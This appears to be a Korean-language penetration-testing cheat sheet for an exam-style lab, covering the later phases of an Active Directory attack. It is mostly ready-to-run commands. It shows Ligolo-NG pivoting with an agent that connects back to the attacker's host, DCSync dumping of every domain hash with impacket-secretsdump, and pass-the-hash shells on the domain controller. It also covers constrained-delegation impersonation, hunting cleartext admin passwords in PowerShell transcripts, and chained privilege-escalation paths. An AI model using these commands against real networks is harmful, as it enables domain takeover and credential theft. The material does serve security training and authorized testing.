## PHASE 10 — 피벗 (내부 서브넷 접근)

```bash
# Ligolo-NG (선호)
sudo ip tuntap add user USERNAME mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 타깃에서:
agent.exe -connect KALI_IP:11601 -ignore-cert

# Ligolo 콘솔:
session
ifconfig
start

# Kali 라우팅:
sudo ip route add $TARGET/24 dev ligolo

# 터널을 통한 콜백:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## PHASE 11 — 도메인 관리자

```bash
# DCSync 도메인 전체 해시
impacket-secretsdump 'DOMAIN/USER:PASS'@DC_IP -just-dc
impacket-secretsdump 'DOMAIN/USER'@DC_IP -hashes :NTHASH -just-dc

# DC에서 쉘
evil-winrm -i DC_IP -u Administrator -H NTHASH
impacket-psexec 'DOMAIN/Administrator'@DC_IP -hashes :NTHASH

# Proof
type C:\Users\Administrator\Desktop\proof.txt
```

### Constrained Delegation

```bash
impacket-getST -spn cifs/target.domain.com -impersonate Administrator DOMAIN/svcaccount:PASS -dc-ip DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@target.domain.com
```

## 핵심 패턴 — PowerShell 트랜스크립트 크리덴셜 누출

시험 당일 1등 AD 열거 기법. 아무 도메인 유저가 로그/트랜스크립트/모니터링 디렉터리가 있는 공유에 SMB 읽기 권한만 있어도, ConvertTo-SecureString 과 PSCredential 을 grep한다.

트랜스크립트 파일 속 특징 패턴:

- `ConvertTo-SecureString CLEARTEXT -AsPlainText -Force`
- `New-Object System.Management.Automation.PSCredential DOMAIN\Administrator`

절차:

1. `nxc smb IP -u USER -p PASS -d DOMAIN --shares`
2. 읽을 수 있는 비기본 공유마다: `smbclient //IP/share -c 'recurse ON; ls'`
3. PowerShell_transcript.*.txt 파일 우선
4. 대상 다운로드 후 ConvertTo-SecureString 을 먼저 grep

낮은 권한 유저가 공유 읽기 권한만으로 PowerShell 트랜스크립트에서 도메인 관리자 평문 패스워드를 찾은 사례가 있다 — 트랜스크립트 grep은 초반에 돌린다.

열거 먼저, 고급 공격은 나중.

## 빠른 참조

### 해시 타입

- NTLM (hashcat 1000): PtH 바로 가능
- NTLMv2 (hashcat 5600): Responder 수집 — 크랙 필수
- Kerberoast (hashcat 13100): GetUserSPNs
- AS-REP (hashcat 18200): GetNPUsers
- DCC2 (hashcat 2100): 캐시된 해시 — 느림

### 문법 함정

- bloodyAD 해시: `-p ':NTHASH'` (`-hashes` 플래그 없음)
- certipy-ad: `-target` 에는 hostname 대신 IP
- evil-winrm `-H`: NT 해시만 (32자), LM:NT 형식 아님
- evil-winrm IP 실패 시: 도메인 이름으로 시도
- ntpdate: Kerberos/cert 작업 전에 매번
- users.txt: 한 줄에 하나, 콤마 구분 금지
- C:\Temp 는 없을 수 있다: C:\Windows\Temp\ 사용

### 흔한 체인 패턴

```text
creds -> ForceChangePassword -> GenericAll -> Kerberoast -> DCSync -> DA
creds -> WriteOwner group -> shadow creds -> GenericAll -> ESC9 -> DA
SYSVOL -> GPP cpassword -> gpp-decrypt -> Kerberoast -> DA
AS-REP Roast -> crack -> WriteDacl -> DCSync -> DA
```
